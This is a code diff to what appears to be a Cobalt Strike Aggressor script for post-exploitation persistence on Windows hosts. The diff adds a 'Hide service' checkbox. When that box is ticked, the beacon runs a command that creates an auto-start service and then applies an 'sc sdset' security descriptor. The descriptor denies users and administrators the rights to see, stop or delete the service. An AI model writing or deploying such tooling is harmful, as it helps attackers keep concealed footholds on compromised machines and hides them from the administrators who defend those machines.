@@ -46,10 +46,16 @@ sub InstallSchedule{
 }
 
 sub InstallService{
-    local('$Name $Path');
+    local('$Name $Path $Hide_cmd');
     $Name = $3['SerName'];
     $Path = replace($3['Path'], "\"", "");
-    bshell($bid, "sc create \" $+ $Name\" binpath= \"cmd /c start \" $+ $Path\"\"&&sc config \" $+ $Name\" start= auto&&net start   $+ $Name");
+    $Hide_cmd = "sc sdset  $+  $Name \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"";
+    if ($3['Hide'] eq "true"){
+       bshell!($bid, "sc create \" $+ $Name\" binPath= \" $+ $Path\" && sc config \" $+ $Name\" start= auto &&  $+  $Hide_cmd");
+    }
+    else{
+        bshell!($bid, "sc create \" $+ $Name\" binPath= \" $+ $Path\" && sc config \" $+ $Name\" start= auto");
+    }
 }
 
 
@@ -100,6 +106,7 @@ sub InstallService{
                     dialog_description($Dialog, "Register an executable file as a service");
                     drow_text($Dialog, "SerName", "Service Name: ");
                     drow_text($Dialog, "Path", "Bin Path: ");
+                    drow_checkbox($Dialog, "Hide", "Hide service: ", "");
                     dbutton_action($Dialog, "Install");
                     dialog_show($Dialog);
                 }
